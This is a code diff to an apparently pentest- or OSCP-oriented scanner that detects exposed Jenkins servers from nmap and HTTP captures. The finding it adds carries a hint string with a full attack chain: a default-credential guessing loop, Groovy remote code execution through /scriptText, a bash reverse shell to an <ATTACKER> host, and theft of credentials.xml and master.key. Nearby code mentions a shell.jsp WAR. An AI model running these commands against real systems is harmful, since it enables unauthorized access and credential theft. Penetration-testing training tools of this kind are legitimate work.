@@ -1940,6 +1940,29 @@ _AJP_GNMAP = re.compile(
     r'(?i)Host:\s+([\w.:]+)[^\r\n]*8009/open/tcp//ajp13?/'
 )
 
+# iter-229: Jenkins /script Groovy console exposure. Prior coverage
+# handled the credentials.xml encrypted blob and $_JOB_PASSWORD env
+# vars, but the LIVE Jenkins UI is the primary OSCP+ Jenkins path -
+# either anon /script (misconfigured older Jenkins) OR default creds
+# on `/manage` giving Groovy-console RCE.
+#
+# Signal A: `X-Jenkins:` HTTP response header - dispositive, only
+# Jenkins servers emit this.
+_JENKINS_HEADER = re.compile(
+    r'(?i)^X-Jenkins(?:-Session)?\s*:\s*(\S+)',
+    re.MULTILINE
+)
+# Signal B: nmap http-title `Dashboard [Jenkins]` or captured HTML
+# `<title>Dashboard [Jenkins]</title>`.
+_JENKINS_TITLE = re.compile(
+    r'(?i)(?:http-title\s*:\s*|<title>)\s*Dashboard\s*\[Jenkins\]'
+)
+# Signal C: captured /script or /jenkins/script path reference.
+_JENKINS_SCRIPT_PATH = re.compile(
+    r'(?i)(?:(?:GET|POST|HEAD)\s+/|https?://[^/\r\n\s]{3,80}/)'
+    r'(?:jenkins/)?script(?:/|\?|\s|$)'
+)
+
 # iter-228: Apache Tomcat web-manager exposure. Prior iter-213
 # handled AJP:8009 (Ghostcat). This is the HTTP:8080/8443/9000
 # side: /manager/html + /host-manager which accept HTTP Basic auth
@@ -2856,6 +2879,55 @@ def _multiline_passes(path, report, store):
                              f"exam-legal manual: build WAR by hand "
                              f"with jar cvf rev.war shell.jsp (no "
                              f"msfvenom quota cost){_cve_hint}"))
+
+    # iter-229: Jenkins /script Groovy console exposure. Fires on any
+    # of:
+    #   (a) X-Jenkins header - dispositive alone
+    #   (b) http-title Dashboard [Jenkins] - dispositive alone
+    #   (c) /script path reference AND some other Jenkins signal
+    # Doc-file gate applies.
+    if not filters.is_doc_file(path):
+        _jh_m = _JENKINS_HEADER.search(text[:16384])
+        _jt_m = _JENKINS_TITLE.search(text[:16384])
+        _js_m = _JENKINS_SCRIPT_PATH.search(text[:16384])
+        # Any of A/B alone dispositive; C requires A or B or version.
+        _jenkins_fire = bool(_jh_m or _jt_m or (_js_m and _jh_m))
+        if _jenkins_fire:
+            _jenkins_ver = _jh_m.group(1) if _jh_m else "unknown"
+            _jenkins_host_m = re.search(
+                r'(?im)^Nmap\s+scan\s+report\s+for\s+([\w.\-:]+)',
+                text[:16384])
+            _jhost = (_jenkins_host_m.group(1) if _jenkins_host_m
+                       else "<jenkins-host>")
+            # Try to extract port from URL context.
+            _jport_m = re.search(
+                r'(?i)https?://[\w.\-]+:(\d+)/',
+                text[:16384])
+            _jport = _jport_m.group(1) if _jport_m else "8080"
+            report.add("HIGH", "SECRET-SIDECHANNEL", path,
+                       _ln(_jh_m or _jt_m or _js_m),
+                       f"Jenkins {_jenkins_ver} exposed on {_jhost}"
+                       f":{_jport} - check /script + default creds",
+                       hint=(f"anon /script test: curl -s "
+                             f"http://{_jhost}:{_jport}/script  |  "
+                             f"grep 200 = walk-in Groovy RCE  |  "
+                             f"default creds: for c in admin:admin "
+                             f"admin:password admin:jenkins "
+                             f"jenkins:jenkins jenkins:admin "
+                             f"root:root admin:changeme; do curl "
+                             f"-sI -u \"$c\" http://{_jhost}:{_jport}"
+                             f"/manage | head -1 | grep -v 401 && "
+                             f"echo FOUND:$c; done  |  Groovy RCE "
+                             f"body once inside /script: curl -u "
+                             f"<cred> --data-urlencode "
+                             f"'script=println \"id\".execute().text' "
+                             f"http://{_jhost}:{_jport}/scriptText  "
+                             f"|  reverse shell: swap `id` for "
+                             f"[bash,-c,'bash -i >& /dev/tcp/"
+                             f"<ATTACKER>/4444 0>&1']  |  loot "
+                             f"credentials.xml: /var/lib/jenkins/"
+                             f"credentials.xml + master.key + "
+                             f"hudson.util.Secret for offline decrypt"))
 
     # iter-199: OpenSSH banner detection + CVE range flags. Emits INFO
     # RECON per unique version + a HIGH marker for each known-vulnerable
